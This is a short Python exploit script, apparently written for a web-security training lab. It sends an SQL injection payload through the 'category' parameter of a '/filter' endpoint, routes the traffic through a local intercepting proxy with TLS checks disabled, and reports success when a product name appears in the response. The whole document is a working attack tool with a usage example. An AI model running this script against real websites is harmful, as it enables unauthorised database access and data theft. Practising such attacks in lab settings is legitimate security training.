import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

FAIL = -1

def is_exploitable(url, category):
    path = '/filter?category='
    response = requests.get(
        url + path + category,
        verify=False,
        proxies=proxies)
    return "Cat Grin" in response.text

if __name__ == "__main__":
    try:
        url =sys.argv[1].strip()
        category = sys.argv[2].strip()
        if is_exploitable(url, category):
            print("[+] SQL injection successful!")
        else:
            print("[-] SQL injection unsuccessful")
    except IndexError:
        print("[-] Usage: %s <url> <category>" % sys.argv[0])
        print("[-] Example: %s www.example.com '1=1'" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL)     